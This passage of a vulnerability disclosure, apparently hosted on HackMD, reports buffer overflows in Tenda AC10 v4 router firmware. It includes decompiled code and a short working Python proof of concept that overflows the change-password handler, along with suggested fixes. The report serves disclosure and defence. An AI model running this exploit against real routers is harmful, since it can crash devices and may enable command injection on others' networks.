![fromSetRouteStatic](https://hackmd.io/_uploads/SyoEj-AeR.gif)

## Any suggested solutions to fix this

Reduce max size in `websSafeGetVar` for &#34;list&#34;

## Severity (e.g. CVSS v3.x)

Buffer Overflow, possible command injection

## Acknowledgement

Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One

## Assigned CVE

Not yet

# 3. Possible Buffer Overflow in fromSysToolChangePwd

## Affected model(s) and firmware/software version(s)

Product: AC10 v4

Version: US_AC10V4.0si_V16.03.10.20_cn

Binary: `/bin/httpd`

## Vulnerability description and potential impacts

In fromSysToolChangePwd, it gets SYSOPS from request without limited the length:

```c
sysops = websGetVar(param_1, &#34;SYSOPS&#34;, &amp; DAT_004fd3e0);
sysps = websGetVar(param_1, &#34;SYSPS&#34;, &amp; DAT_004fd3e0);
sysps2 = websGetVar(param_1, &#34;SYSPS2&#34;, &amp; DAT_004fd3e0);
GetValue(&#34;sys.userpass&#34;, &amp; local_2c);
iVar1 = strcmp( &amp; local_2c, sysops);
if ((iVar1 != 0) || (iVar1 = strcmp(sysps, sysps2), iVar1 != 0)) {
    websRedirect(param_1, &#34;/system_password.html?1&#34;);
    return;
}
iVar1 = strcmp(sysops, sysps);
if (iVar1 == 0) {
    websRedirect(param_1, &#34;/system_password.html&#34;);
    return;
}
SetValue(&#34;sys.userpass&#34;, sysps);
```

It first executes `GetValue` to get current password and compares to make sure the current password is correct, then it saves new password using `SetValue`. But because new password (which is `SYSPS`) isn’t limited in length so after we set new password, we execute `fromSysToolChangePwd` again, it gets current password via `GetValue` and can cause buffer overflow for `local_2c` variable.

## Step-by-step instructions to reproduce the issue

- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server and second argument is old password

## Proof-of-concept (PoC) or exploit code for the issue

```python
#!/usr/bin/python3

import sys
import requests

payload = b&#39;A&#39;*0x200

def run():
    url = f&#34;http://{sys.argv[1]}/goform/SysToolChangePwd&#34;
    data = {
        &#34;SYSOPS&#34;: sys.argv[2],
        &#34;SYSPS&#34;: payload,
        &#34;SYSPS2&#34;: payload
    }
    requests.post(url=url, data=data)
    requests.post(url=url, data=data)

run()
```

## Any suggested solutions to fix this

Check password length before save

## Severity (e.g. CVSS v3.x)

Possible Buffer Overflow, possible command injection

## Acknowledgement

Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One

## Assigned CVE

Not yet</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="UV7s8YJ1-d5jAI9mJu1o4kn5dnGXJgm7xFi4"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="2cce4624-734f-4805-bc36-3befbecdf697"></script>
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="bg-white btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="2cce4624-734f-4805-bc36-3befbecdf697">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="https://hackmd.io/api/i18n.js"></script>
     <script src="https://assets.hackmd.io/build/font-vendor.eaa8dd82d4e056021b8c.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.04da453a2a68f624f4d4.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.94ca39727118897623cd.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.e537850a918313f6b528.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.542e7daea665107a9e4b.js" defer="defer"></script>

    

</body>
</html>
